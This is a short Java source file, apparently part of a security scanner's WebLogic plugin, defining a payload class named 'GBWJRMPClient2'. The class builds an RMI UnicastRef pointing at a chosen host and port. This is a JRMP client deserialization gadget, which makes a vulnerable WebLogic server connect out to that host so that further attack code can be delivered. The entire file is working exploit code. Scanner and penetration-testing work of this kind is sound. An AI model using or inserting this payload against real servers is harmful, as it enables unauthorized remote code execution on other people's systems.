package com.gbw.scanner.plugins.scripts.weblogic.payload;


import com.gbw.scanner.Host;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;


import java.rmi.server.ObjID;
import java.util.Random;

public class GBWJRMPClient2 implements GBWNoEchoPayload<UnicastRef> {

    public UnicastRef getObject (Host host) {

        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host.getIp(), host.getPort());
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        return ref;
    }

    @Override
    public String getName() {
        return "GBWJRMPClient2";
    }

}

